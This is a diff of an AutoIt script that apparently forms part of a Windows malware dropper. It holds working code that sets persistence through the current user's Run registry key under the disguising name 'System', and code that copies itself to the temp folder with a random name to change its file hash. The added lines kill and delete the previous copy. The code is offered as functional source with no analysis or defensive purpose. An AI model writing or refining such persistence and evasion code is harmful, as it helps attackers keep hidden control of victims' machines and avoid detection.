@@ -1,8 +1,28 @@
 #include <MsgBoxConstants.au3>
 #include <FileConstants.au3>
 #include <WinAPIFiles.au3>
+#include <File.au3>
+
+;init
+Func init()
+   If $CmdLine[0] > 0 Then
+	  $action = $CmdLine[1]
+	  $arg = $CmdLine[2]
+
+	  Dim $szDrive, $szDir, $szFName, $szExt
+	  if ($action == "delete_previous") Then
+		 if FileExists($arg) Then
+			_PathSplit($arg, $szDrive, $szDir, $szFName, $szExt)
+			ProcessClose($szFName & $szExt )
+			Sleep(2000)
+			FileDelete($arg)
+		 EndIf
+	  EndIf
+   EndIf
+EndFunc
 
 ;Get the exe persistent for current user
+;TODO add check if key already there before write
 Func SetPersistent4CurrentUser()
    RegWrite("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "System", "REG_SZ", @ScriptDir & "\" & @ScriptName)
 EndFunc
@@ -96,7 +116,7 @@ Func CopyTempRun($newName = RandomString())
    EndIf
    FileWriteLine($hFileOpen, "1")
    FileClose($hFileOpen)
-   RunWait(@TempDir & "\" & $newName);
+   RunWait(@TempDir & "\" & $newName & " " & "delete_previous" & " " & @ScriptDir & "\" & @ScriptName);
 EndFunc
 
 Func isRunningFromTemp()
@@ -107,7 +127,7 @@ EndFunc
 
 ;if it's not running from temp, drop child to temp with different hash
 Func Move2Temp($newName = RandomString())
-   if (@ScriptDir & "\" & @ScriptName == @TempDir & "\" & @ScriptName) Then
+   if isRunningFromTemp() Then
 	  Return 1
    Else
 	  CopyTempRun($newName)
